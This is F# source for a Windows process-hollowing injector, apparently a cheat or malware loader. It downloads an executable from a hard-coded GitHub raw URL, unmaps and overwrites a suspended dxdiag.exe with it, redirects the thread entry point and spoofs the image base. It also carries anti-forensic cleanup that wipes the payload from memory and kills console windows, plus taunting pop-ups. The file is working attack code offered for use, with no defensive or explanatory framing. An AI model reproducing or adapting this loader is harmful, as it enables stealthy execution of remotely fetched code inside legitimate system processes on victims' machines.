open System
open System.IO
open System.Net.Http
open System.Reflection
open System.Text
open System.Runtime.InteropServices

type CtrlHandlerRoutine = delegate of uint32 -> bool
type EnumWinProc = delegate of nativeint * nativeint -> bool

module Native =
    [<DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)>]
    extern bool CreateProcessW(string app, string cmd, nativeint secAttr, nativeint thrAttr, bool inheritH, uint32 flags, nativeint env, string cwd, nativeint si, nativeint pi)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern nativeint VirtualAllocEx(nativeint h, nativeint addr, uint64 size, uint32 atype, uint32 prot)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool VirtualProtectEx(nativeint h, nativeint addr, uint64 size, uint32 prot, nativeint oldProt)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool WriteProcessMemory(nativeint h, nativeint baseAddr, nativeint buf, uint64 size, nativeint written)

    [<DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)>]
    extern int ZwUnmapViewOfSection(nativeint h, nativeint addr)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool GetThreadContext(nativeint h, nativeint ctx)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool SetThreadContext(nativeint h, nativeint ctx)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern uint32 ResumeThread(nativeint h)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern uint32 SuspendThread(nativeint h)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool TerminateProcess(nativeint h, uint32 code)

    [<DllImport("kernel32.dll")>]
    extern nativeint GetCurrentProcess()

    [<DllImport("kernel32.dll")>]
    extern uint32 GetCurrentProcessId()

    [<DllImport("advapi32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool OpenProcessToken(nativeint h, uint32 acc, nativeint& tok)

    [<DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)>]
    extern bool LookupPrivilegeValueW(string system, string name, nativeint luid)

    [<DllImport("advapi32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool AdjustTokenPrivileges(nativeint tok, bool disAll, nativeint newState, uint32 len, nativeint prev, nativeint retLen)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool CloseHandle(nativeint h)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool FreeConsole()

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern uint32 GetConsoleProcessList(nativeint buf, uint32 cap)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern nativeint OpenProcess(uint32 acc, bool inheritH, uint32 pid)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool SetProcessWorkingSetSize(nativeint h, nativeint minSize, nativeint maxSize)

    [<DllImport("kernel32.dll")>]
    extern nativeint GetConsoleWindow()

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool ShowWindow(nativeint h, int cmd)

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool RegisterHotKey(nativeint hWnd, int id, uint32 modifiers, uint32 vk)

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool UnregisterHotKey(nativeint hWnd, int id)

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern int GetMessageW(nativeint msg, nativeint hWnd, uint32 fmin, uint32 fmax)

    [<DllImport("user32.dll")>]
    extern bool TranslateMessage(nativeint msg)

    [<DllImport("user32.dll")>]
    extern nativeint DispatchMessageW(nativeint msg)

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool EnumWindows(EnumWinProc cb, nativeint lp)

    [<DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)>]
    extern int GetWindowTextW(nativeint h, nativeint buf, int max)

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern int GetWindowTextLengthW(nativeint h)

    [<DllImport("user32.dll", SetLastError = true, ExactSpelling = true)>]
    extern nativeint GetWindow(nativeint h, uint32 cmd)

    [<DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)>]
    extern bool SetWindowTextW(nativeint h, string text)

    [<DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)>]
    extern bool SetConsoleCtrlHandler(CtrlHandlerRoutine h, bool add)

let cprint (c: ConsoleColor) (msg: string) =
    let old = Console.ForegroundColor
    Console.ForegroundColor <- c
    Console.WriteLine(msg)
    Console.ForegroundColor <- old

let inline usePin (arr: byte[]) (f: nativeint -> 'a) : 'a =
    let g = GCHandle.Alloc(arr, GCHandleType.Pinned)
    try f (g.AddrOfPinnedObject())
    finally g.Free()

let readI32 (b: byte[]) off = BitConverter.ToInt32(b, off)
let readI16 (b: byte[]) off = BitConverter.ToInt16(b, off)
let readI64 (b: byte[]) off = BitConverter.ToInt64(b, off)

let mutable hollowPid = 0
let mutable payloadMem : byte[] = null
let mutable cmdHidden = false
let mutable failStep = ""
let mutable failErr = 0
let mutable failProc = 0n
let mutable failThread = 0n
let mutable ctrlDel : CtrlHandlerRoutine = null

let beep f d =
    try Console.Beep(f, d)
    with _ -> ()

let nope tag err =
    failStep <- tag
    failErr <- err
    false

let enableDebugPrivilege () =
    try
        let mutable tok = 0n
        let hp = Native.GetCurrentProcess()
        if Native.OpenProcessToken(hp, 0x0028u, &tok) then
            let luidArr = Array.zeroCreate<byte> 8
            let okLuid = usePin luidArr (fun p -> Native.LookupPrivilegeValueW(null, "SeDebugPrivilege", p))
            if okLuid then
                let tp = Array.zeroCreate<byte> 16
                BitConverter.GetBytes(1).CopyTo(tp, 0)
                Array.Copy(luidArr, 0, tp, 4, 8)
                BitConverter.GetBytes(2).CopyTo(tp, 12)
                usePin tp (fun p -> Native.AdjustTokenPrivileges(tok, false, p, 0u, 0n, 0n)) |> ignore
            Native.CloseHandle(tok) |> ignore
    with _ -> ()

let downloadFile (url: string) : byte[] =
    use handler = new HttpClientHandler(AllowAutoRedirect = true)
    use client = new HttpClient(handler)
    client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0")
    client.GetByteArrayAsync(url) |> Async.AwaitTask |> Async.RunSynchronously

let hollow (buffer: byte[]) (host: string) : bool =
    try
        if buffer.Length < 0x40 then nope "pe" 0
        elif readI16 buffer 0 <> 0x5A4Ds then nope "pe" 0
        else
            let e_lfanew = readI32 buffer 0x3C
            if readI32 buffer e_lfanew <> 0x00004550 then nope "pe" 0
            elif readI16 buffer (e_lfanew + 0x18) <> 0x20Bs then nope "pe" 0
            else
                let sizeOfImage = readI32 buffer (e_lfanew + 0x18 + 0x38)
                let sizeOfHeaders = readI32 buffer (e_lfanew + 0x18 + 0x3C)
                let entryPoint = readI32 buffer (e_lfanew + 0x18 + 0x10)
                let nSec = int (readI16 buffer (e_lfanew + 0x4 + 0x2))
                let sizeOpt = int (readI16 buffer (e_lfanew + 0x4 + 0x10))
                let imageBase = readI64 buffer (e_lfanew + 0x18 + 0x18)
                let si = Array.zeroCreate<byte> 0x68
                BitConverter.GetBytes(0x68).CopyTo(si, 0)
                let pi = Array.zeroCreate<byte> 0x18
                let gsi = GCHandle.Alloc(si, GCHandleType.Pinned)
                let gpi = GCHandle.Alloc(pi, GCHandleType.Pinned)
                try
                    let ok = Native.CreateProcessW(null, host, 0n, 0n, false, 0x00000004u ||| 0x08000000u, 0n, null, gsi.AddrOfPinnedObject(), gpi.AddrOfPinnedObject())
                    if not ok then nope "proc" (Marshal.GetLastWin32Error())
                    else
                        let hProcess = readI64 pi 0x0 |> nativeint
                        let hThread = readI64 pi 0x8 |> nativeint
                        let dwPid = readI32 pi 0x10
                        failProc <- hProcess
                        failThread <- hThread
                        let kill () =
                            try Native.TerminateProcess(hProcess, 1u) |> ignore with _ -> ()
                            try Native.CloseHandle(hThread) |> ignore with _ -> ()
                            try Native.CloseHandle(hProcess) |> ignore with _ -> ()
                        Native.ZwUnmapViewOfSection(hProcess, nativeint imageBase) |> ignore
                        let remote = Native.VirtualAllocEx(hProcess, nativeint imageBase, uint64 sizeOfImage, 0x3000u, 0x04u)
                        if remote = 0n then
                            let e = Marshal.GetLastWin32Error()
                            kill ()
                            nope "mem" e
                        else
                            let hdr = Array.sub buffer 0 sizeOfHeaders
                            let w1 = usePin hdr (fun p -> Native.WriteProcessMemory(hProcess, nativeint imageBase, p, uint64 sizeOfHeaders, 0n))
                            let mutable allOk = w1
                            for i in 0 .. nSec - 1 do
                                let secOff = e_lfanew + (0x18 + sizeOpt) + (0x28 * i)
                                let vaddr = readI32 buffer (secOff + 0x0C)
                                let rawSize = readI32 buffer (secOff + 0x10)
                                let rawPtr = readI32 buffer (secOff + 0x14)
                                if rawSize > 0 && rawPtr + rawSize <= buffer.Length then
                                    let sec = Array.sub buffer rawPtr rawSize
                                    let ws = usePin sec (fun p -> Native.WriteProcessMemory(hProcess, nativeint (imageBase + int64 vaddr), p, uint64 rawSize, 0n))
                                    if not ws then allOk <- false
                            let mutable gtx = false
                            let mutable tries = 0
                            let ctx = Array.zeroCreate<byte> 0x4D0
                            BitConverter.GetBytes(0x0010001B).CopyTo(ctx, 0x30)
                            while not gtx && tries < 15 do
                                tries <- tries + 1
                                gtx <- usePin ctx (fun p -> Native.GetThreadContext(hThread, p))
                                if not gtx then Threading.Thread.Sleep(200)
                            if not allOk then
                                kill ()
                                nope "write" 0
                            elif not gtx then
                                let e = Marshal.GetLastWin32Error()
                                kill ()
                                nope "ctx" e
                            else
                                let rdx = readI64 ctx 0x88
                                if rdx <> 0L then
                                    let ib = BitConverter.GetBytes(imageBase)
                                    usePin ib (fun p -> Native.WriteProcessMemory(hProcess, nativeint (rdx + 16L), p, 8UL, 0n)) |> ignore
                                let newRip = imageBase + int64 entryPoint
                                let ripB = BitConverter.GetBytes(newRip)
                                Array.Copy(ripB, 0, ctx, 0x80, 8)
                                let stc = usePin ctx (fun p -> Native.SetThreadContext(hThread, p))
                                if not stc then
                                    let e = Marshal.GetLastWin32Error()
                                    kill ()
                                    nope "setctx" e
                                else
                                    let oldProt = Array.zeroCreate<byte> 4
                                    for i in 0 .. nSec - 1 do
                                        let secOff = e_lfanew + (0x18 + sizeOpt) + (0x28 * i)
                                        let vaddr = readI32 buffer (secOff + 0x0C)
                                        let vsize = readI32 buffer (secOff + 0x08)
                                        let chars = readI32 buffer (secOff + 0x24)
                                        let prot =
                                            if chars &&& 0x20000000 <> 0 then 0x20u
                                            elif chars &&& 0x80000000 <> 0 then 0x04u
                                            else 0x02u
                                        usePin oldProt (fun po ->
                                            try Native.VirtualProtectEx(hProcess, nativeint (imageBase + int64 vaddr), uint64 vsize, prot, po) |> ignore
                                            with _ -> ()) |> ignore
                                    if rdx <> 0L then
                                        let spoof = BitConverter.GetBytes(0x140000000L)
                                        usePin spoof (fun p ->
                                            try Native.WriteProcessMemory(hProcess, nativeint (rdx + 16L), p, 8UL, 0n) |> ignore
                                            with _ -> ()) |> ignore
                                    let rt = Native.ResumeThread(hThread)
                                    if rt = 0xFFFFFFFFu then
                                        let e = Marshal.GetLastWin32Error()
                                        kill ()
                                        nope "resume" e
                                    else
                                        Threading.Thread.Sleep(1200)
                                        let mutable running = false
                                        let mutable guard = 0
                                        while not running && guard < 8 do
                                            guard <- guard + 1
                                            let r = Native.ResumeThread(hThread)
                                            if r = 0xFFFFFFFFu then guard <- 8
                                            elif r <= 1u then running <- true
                                            else Threading.Thread.Sleep(300)
                                        if running then
                                            let s = Native.SuspendThread(hThread)
                                            if s = 0xFFFFFFFFu then running <- false
                                            else
                                                Native.ResumeThread(hThread) |> ignore
                                                running <- s = 0u
                                        if not running then
                                            let e = Marshal.GetLastWin32Error()
                                            kill ()
                                            nope "resume" e
                                        else
                                            hollowPid <- dwPid
                                            Native.CloseHandle(hThread) |> ignore
                                            Native.CloseHandle(hProcess) |> ignore
                                            true
                finally
                    gsi.Free()
                    gpi.Free()
                    failProc <- 0n
                    failThread <- 0n
    with _ ->
        try
            if failThread <> 0n then Native.TerminateProcess(failProc, 1u) |> ignore
        with _ -> ()
        try
            if failThread <> 0n then Native.CloseHandle(failThread) |> ignore
        with _ -> ()
        try
            if failProc <> 0n then Native.CloseHandle(failProc) |> ignore
        with _ -> ()
        failProc <- 0n
        failThread <- 0n
        nope "ex" 0

let doInject () =
    beep 700 120
    try
        enableDebugPrivilege ()
        let url = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe"
        let host = "C:\\Windows\\System32\\dxdiag.exe"
        if not (File.Exists(host)) then
            failStep <- "host"
            failErr <- 0
            cprint ConsoleColor.Red "fail @host"
            beep 220 400
        else
            let payload =
                try downloadFile url
                with _ ->
                    failStep <- "net"
                    reraise ()
            payloadMem <- payload
            failStep <- ""
            failErr <- 0
            let mutable okH = false
            let mutable att = 0
            while not okH && att < 3 do
                att <- att + 1
                okH <- hollow payload host
                if not okH && att < 3 then Threading.Thread.Sleep(500)
            if okH then
                cprint ConsoleColor.Green (sprintf "ok pid=%d" hollowPid)
                beep 1000 200
                cprint ConsoleColor.Red "close this cmd"
            else
                cprint ConsoleColor.Red (sprintf "fail @%s err=%d" failStep failErr)
                beep 220 400
    with _ ->
        if failStep = "" then failStep <- "ex"
        cprint ConsoleColor.Red (sprintf "fail @%s err=%d" failStep failErr)
        beep 220 400
    failStep <- ""
    failErr <- 0

let doCleaner () =
    beep 700 120
    try
        if payloadMem <> null && payloadMem.Length > 0 then
            try Array.Clear(payloadMem, 0, payloadMem.Length)
            with _ -> ()
            payloadMem <- null
        try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            GC.Collect()
        with _ -> ()
        try
            let h = Native.GetCurrentProcess()
            Native.SetProcessWorkingSetSize(h, nativeint -1, nativeint -1) |> ignore
        with _ -> ()
        if hollowPid <> 0 then
            try
                let h = Native.OpenProcess(0x0100u, false, uint32 hollowPid)
                if h <> 0n then
                    Native.SetProcessWorkingSetSize(h, nativeint -1, nativeint -1) |> ignore
                    Native.CloseHandle(h) |> ignore
            with _ -> ()
        cprint ConsoleColor.Green "ok"
        beep 1000 200
        let curPid = Native.GetCurrentProcessId()
        let arr = Array.zeroCreate<byte> 256
        let nn = usePin arr (fun p -> Native.GetConsoleProcessList(p, 64u))
        let detached =
            try Native.FreeConsole()
            with _ -> false
        if not detached then
            cprint ConsoleColor.Red "fail @detach"
            beep 220 400
        else
            let mutable killed = 0
            for i in 0 .. int nn - 1 do
                let pid = BitConverter.ToInt32(arr, i * 4)
                if pid <> 0 && uint32 pid <> curPid then
                    try
                        use p = Diagnostics.Process.GetProcessById(pid)
                        if p.ProcessName.ToLowerInvariant() = "cmd" then
                            p.Kill()
                            killed <- killed + 1
                    with _ -> ()
            cprint ConsoleColor.Green (sprintf "cmd off (%d)" killed)
            beep 1200 200
    with _ ->
        cprint ConsoleColor.Red "fail"
        beep 220 400

let showCmd () =
    try
        let h = Native.GetConsoleWindow()
        if h <> 0n && Native.ShowWindow(h, 5) then cmdHidden <- false
    with _ -> ()

let hideCmdSilent () =
    try
        let h = Native.GetConsoleWindow()
        if h <> 0n && Native.ShowWindow(h, 0) then cmdHidden <- true
    with _ -> ()

let toggleCmd () =
    if cmdHidden then
        showCmd ()
        beep 1000 200
    else
        hideCmdSilent ()
        beep 600 150

let hideMshtaFrame (title: string) =
    try
        let mutable doneH = false
        let mutable guard = 0
        while not doneH && guard < 30 do
            guard <- guard + 1
            let cb = EnumWinProc(fun h _ ->
                if doneH then false
                else
                    let hit =
                        try
                            if Native.GetWindowTextLengthW(h) <> title.Length then false
                            else
                                let b = Array.zeroCreate<byte> 1024
                                let g = GCHandle.Alloc(b, GCHandleType.Pinned)
                                try
                                    let n = Native.GetWindowTextW(h, g.AddrOfPinnedObject(), 512)
                                    n > 0 && Text.Encoding.Unicode.GetString(b, 0, n * 2) = title
                                finally g.Free()
                        with _ -> false
                    if hit then
                        try Native.ShowWindow(h, 0) |> ignore with _ -> ()
                        doneH <- true
                        false
                    else true)
            Native.EnumWindows(cb, 0n) |> ignore
            GC.KeepAlive(cb)
            if not doneH then Threading.Thread.Sleep(100)
    with _ -> ()

let blankDialogTitle (jt: string) =
    try
        let mutable doneB = false
        let mutable guard = 0
        while not doneB && guard < 30 do
            guard <- guard + 1
            let cb = EnumWinProc(fun h _ ->
                if doneB then false
                else
                    let hit =
                        try
                            if Native.GetWindowTextLengthW(h) <> 16 then false
                            else
                                let b = Array.zeroCreate<byte> 128
                                let g = GCHandle.Alloc(b, GCHandleType.Pinned)
                                try
                                    let n = Native.GetWindowTextW(h, g.AddrOfPinnedObject(), 64)
                                    if n <> 16 then false
                                    else
                                        let t = Text.Encoding.Unicode.GetString(b, 0, n * 2)
                                        if t <> "HTML Application" then false
                                        else
                                            let ow = Native.GetWindow(h, 4u)
                                            if ow = 0n then false
                                            else
                                                let b2 = Array.zeroCreate<byte> 1024
                                                let g2 = GCHandle.Alloc(b2, GCHandleType.Pinned)
                                                try
                                                    let n2 = Native.GetWindowTextW(ow, g2.AddrOfPinnedObject(), 512)
                                                    n2 > 0 && Text.Encoding.Unicode.GetString(b2, 0, n2 * 2) = jt
                                                finally g2.Free()
                                finally g.Free()
                        with _ -> false
                    if hit then
                        try Native.SetWindowTextW(h, "") |> ignore with _ -> ()
                        doneB <- true
                        false
                    else true)
            Native.EnumWindows(cb, 0n) |> ignore
            GC.KeepAlive(cb)
            if not doneB then Threading.Thread.Sleep(100)
    with _ -> ()

let showBox (text: string) =
    beep 500 150
    try
        try
            let h = Native.GetConsoleWindow()
            if h <> 0n then
                Native.ShowWindow(h, 0) |> ignore
                cmdHidden <- true
        with _ -> ()
        let jt = "javascript:alert('" + text + "');close()"
        let psi = Diagnostics.ProcessStartInfo("cmd.exe", "/c start /wait mshta \"" + jt + "\"")
        psi.UseShellExecute <- false
        psi.CreateNoWindow <- true
        use pr = Diagnostics.Process.Start(psi)
        hideMshtaFrame jt
        blankDialogTitle jt
        pr.WaitForExit()
        beep 1000 200
    with _ ->
        beep 220 400

let doTroll () =
    showBox "INJECTED"

let doNote () =
    showBox "you are still a long way from what you desire"

let doLinkVoz () =
    beep 700 120
    try
        let mutable okLink = false
        try
            let psi = Diagnostics.ProcessStartInfo("https://postimg.cc/HjxqxfXT")
            psi.UseShellExecute <- true
            Diagnostics.Process.Start(psi) |> ignore
            okLink <- true
        with _ -> ()
        try
            let th = new Threading.Thread(Threading.ThreadStart(fun () ->
                try
                    let t = Type.GetTypeFromProgID("SAPI.SpVoice")
                    if t <> null then
                        let v = Activator.CreateInstance(t)
                        t.InvokeMember("Speak", BindingFlags.InvokeMethod, null, v, [| box "tomaste bypass inyectado, jajajaja"; box 0 |]) |> ignore
                with _ -> ()))
            th.IsBackground <- true
            th.Start()
        with _ -> ()
        if okLink then beep 1000 200 else beep 220 400
    with _ ->
        beep 220 400

cprint ConsoleColor.Gray "F1 inject | F2 clean | F3 hide | F5 troll | P note | K link+voz"
beep 600 120
beep 900 120
let mutable sair = false
let mutable lastId = 0
let mutable lastAct = 0L
let mutable busy = false
let mutable singleMutex : Threading.Mutex = null

let mutable singleNew = false
try
    singleMutex <- new Threading.Mutex(true, "Global\\HollowF5Mutex", &singleNew)
    if not singleNew then
        singleMutex.Dispose()
        singleMutex <- null
        cprint ConsoleColor.Red "ja rodando"
        beep 220 400
        Environment.Exit(1)
with _ -> ()

try
    ctrlDel <- CtrlHandlerRoutine(fun ev -> ev <= 2u)
    Native.SetConsoleCtrlHandler(ctrlDel, true) |> ignore
with _ -> ()

let fire id =
    if id = 4 then false
    else
        let t = Environment.TickCount64
        if (id <> lastId || t - lastAct > 1500L) && not busy then
            lastId <- id
            lastAct <- t
            busy <- true
            try
                if id = 1 then doInject ()
                elif id = 2 then doCleaner ()
                elif id = 3 then toggleCmd ()
                elif id = 5 then doTroll ()
                elif id = 6 then doNote ()
                elif id = 7 then doLinkVoz ()
            finally busy <- false
        true
let hotOK =
    Native.RegisterHotKey(0n, 1, 0x4u, 0x70u)
    && Native.RegisterHotKey(0n, 2, 0x4u, 0x71u)
    && Native.RegisterHotKey(0n, 3, 0x4u, 0x72u)
    && Native.RegisterHotKey(0n, 4, 0x4u, 0x1Bu)
    && Native.RegisterHotKey(0n, 5, 0x4u, 0x74u)
    && Native.RegisterHotKey(0n, 6, 0x4u, 0x50u)
    && Native.RegisterHotKey(0n, 7, 0x4u, 0x4Bu)
if hotOK then
    let msg = Array.zeroCreate<byte> 48
    usePin msg (fun p ->
        let mutable go = true
        while go do
            let r = Native.GetMessageW(p, 0n, 0u, 0u)
            if r = 0 || r < 0 then go <- false
            else
                let m = BitConverter.ToInt32(msg, 8)
                let id = BitConverter.ToInt32(msg, 16)
                if m = 0x0312 then
                    if not (fire id) then go <- false
                Native.TranslateMessage(p) |> ignore
                Native.DispatchMessageW(p) |> ignore)
    Native.UnregisterHotKey(0n, 1) |> ignore
    Native.UnregisterHotKey(0n, 2) |> ignore
    Native.UnregisterHotKey(0n, 3) |> ignore
    Native.UnregisterHotKey(0n, 4) |> ignore
    Native.UnregisterHotKey(0n, 5) |> ignore
    Native.UnregisterHotKey(0n, 6) |> ignore
    Native.UnregisterHotKey(0n, 7) |> ignore
else
    beep 220 400
    showCmd ()
    while not sair do
        try
            let k = Console.ReadKey(true)
            let shift = k.Modifiers.HasFlag(ConsoleModifiers.Shift)
            if shift && k.Key = ConsoleKey.F1 then
                if not (fire 1) then sair <- true
            elif shift && k.Key = ConsoleKey.F2 then
                fire 2 |> ignore
            elif shift && k.Key = ConsoleKey.F3 then
                fire 3 |> ignore
            elif shift && k.Key = ConsoleKey.F5 then
                fire 5 |> ignore
            elif shift && k.Key = ConsoleKey.P then
                fire 6 |> ignore
            elif shift && k.Key = ConsoleKey.K then
                fire 7 |> ignore
            elif k.Key = ConsoleKey.Escape then
                sair <- true
        with _ -> ()